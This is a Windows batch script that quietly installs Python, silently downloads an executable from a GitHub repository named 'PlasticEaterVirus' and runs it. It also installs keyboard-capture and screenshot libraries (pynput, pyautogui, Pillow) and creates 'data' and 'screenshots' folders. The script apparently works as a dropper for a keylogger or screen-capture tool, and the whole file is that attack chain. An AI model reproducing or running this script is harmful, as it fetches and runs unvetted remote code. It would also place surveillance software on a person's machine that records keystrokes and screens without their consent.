@ECHO OFF
cd C:\PlasticEater
curl https://www.python.org/ftp/python/3.12.3/python-3.12.3-amd64.exe -o pythonInstaller.exe -s
pythonInstaller.exe /quiet
curl https://raw.githubusercontent.com/ETML-Midicix/PlasticEaterVirus/main/Program/script.exe -L -O -s
TIMEOUT /T 5 /nobreak
py -m pip install --upgrade pynput
py -m pip install --upgrade pyautogui
py -m pip install --upgrade Pillow
mkdir data
mkdir screenshots
script.exe
pause